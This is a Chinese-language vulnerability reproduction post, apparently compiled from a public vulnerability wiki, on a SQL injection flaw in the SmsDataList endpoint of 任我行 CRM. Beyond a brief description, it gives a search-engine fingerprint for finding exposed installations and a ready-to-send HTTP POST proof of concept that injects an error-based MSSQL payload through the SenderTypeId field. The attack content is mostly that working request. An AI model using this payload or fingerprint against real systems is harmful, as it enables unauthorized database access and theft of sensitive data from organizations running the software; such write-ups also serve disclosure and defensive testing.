---
title: "任我行 CRM SmsDataList SQL注入漏洞"
date: 2026-10-16 09:10:18
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "任我行-CRM-SmsDataList"
tags:
  - "任我行-CRM-SmsDataList"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

*任我行CRM*系统是客户关系管理,集OA自动化办公、OM目标管理、KM知识管理、HR人力资源为一体集成的企业管理软件。

任我行 CRM SmsDataList 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意数据库语句，获取敏感信息。

## 漏洞影响

任我行 CRM

## 网络测绘

"欢迎使用任我行CRM"

## 漏洞复现

登陆页面

![image-20230828150050416](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150050416.png)

验证POC

```
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 

Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
```

![image-20230828150106754](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828150106754.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E4%BB%BB%E6%88%91%E8%A1%8C-CRM-SmsDataList-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
